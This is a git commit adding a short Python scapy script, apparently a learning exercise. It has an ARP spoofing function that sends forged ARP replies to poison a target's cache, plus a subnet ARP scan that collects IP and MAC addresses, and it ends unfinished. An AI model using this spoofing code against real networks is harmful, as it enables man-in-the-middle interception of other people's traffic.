f792c8ec813b2fc328adb6012dfa21f2fb242743
Mark2051 <125757255+Mark2051@users.noreply.github.com>
2023-09-04 15:44:28 +0300

    Add files via upload
    First commit

---
+++ main.py
@@ -0,0 +1,40 @@
+import scapy.all as scapy
+
+# exit()
+
+def get_mac(ip):
+    arp_req = scapy.ARP(pdst=ip)
+    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
+    arp_req_broadcast = broadcast/arp_req
+    answered = scapy.srp(arp_req_broadcast, timeout=1, verbose=False)[0]
+
+    return answered[0][1].hwsrc
+
+def spoof(target_ip, spoof_ip):
+    target_mac = get_mac(target_ip)
+    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+    scapy.send(packet)
+
+# print(get_mac('172.16.30.93'))
+# print(get_mac('172.16.25.201'))
+from scapy.all import ARP, Ether, srp
+
+target_ip = "172.16.30.1/24"
+# IP Address for the destination
+# create ARP packet
+arp = ARP(pdst=target_ip)
+# create the Ether broadcast packet
+# ff:ff:ff:ff:ff:ff MAC address indicates broadcasting
+ether = Ether(dst="ff:ff:ff:ff:ff:ff")
+# stack them
+packet = ether/arp
+
+result = srp(packet, timeout=3, verbose=0)[0]
+
+# a list of clients, we will fill this in the upcoming loop
+clients = []
+
+for sent, received in result:
+    # for each response, append ip and mac address to `clients` list
+    clients.append({'ip': received.psrc, 'mac': received.hwsrc})
+
